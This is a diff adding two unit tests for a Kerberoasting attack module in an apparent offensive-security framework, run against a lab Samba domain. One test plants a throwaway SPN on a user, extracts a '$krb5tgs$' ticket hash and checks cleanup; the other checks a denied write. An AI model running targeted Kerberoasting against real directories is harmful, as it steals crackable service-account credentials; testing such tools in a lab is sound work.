@@ -1726,6 +1726,56 @@ class TestRoastLab(unittest.TestCase):
         self.assertIn("backup_svc", labels)
         self.assertIn("web_svc", labels)
 
+    def test_targeted_roast_and_cleanup(self):
+        # TARGETED mode: Administrator plants a throwaway SPN on analyst
+        # (who has no SPNs), roasts it, and the plant is gone afterwards
+        out, hashes = self._run(
+            "use auxiliary/attack/kerberoast",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set USERNAME Administrator",
+            "set PASSWORD P@ssw0rd123",
+            "set TARGET analyst",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("planted throwaway SPN fzr/", out)
+        self.assertIn("$krb5tgs$", out)
+        self.assertEqual(len(hashes), 1)
+        self.assertIn("analyst", hashes[0]["label"])
+        # cleanup really happened: analyst has no SPNs left in the directory
+        from impacket.ldap import ldap as impacket_ldap
+        from impacket.ldap import ldapasn1
+        conn = impacket_ldap.LDAPConnection(f"ldap://{HOST}")
+        conn.login("Administrator", "P@ssw0rd123", "forge.local")
+        spns = None
+        for packet in conn.search(
+                searchBase="DC=forge,DC=local",
+                searchFilter="(sAMAccountName=analyst)",
+                attributes=["servicePrincipalName"]):
+            if isinstance(packet, ldapasn1.SearchResultEntry):
+                attrs = {str(a["type"]): [str(v) for v in a["vals"]]
+                         for a in packet["attributes"]}
+                spns = attrs.get("servicePrincipalName", [])
+        conn.close()
+        self.assertEqual(spns, [])
+
+    def test_targeted_denied_cleanly(self):
+        # analyst has no write over backup_svc — the module must report
+        # the denial plainly and produce no hash
+        out, hashes = self._run(
+            "use auxiliary/attack/kerberoast",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set USERNAME analyst",
+            "set PASSWORD Summer2024!",
+            "set TARGET backup_svc",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("SPN write failed", out)
+        self.assertEqual(len(hashes), 0)
+
     def test_asreproast_hits_no_preauth_account(self):
         # The lab flips all three Samba switches ([kdc] require-preauth=no
         # + DONT_REQ_PREAUTH on noauth AND krbtgt), so the roast works:
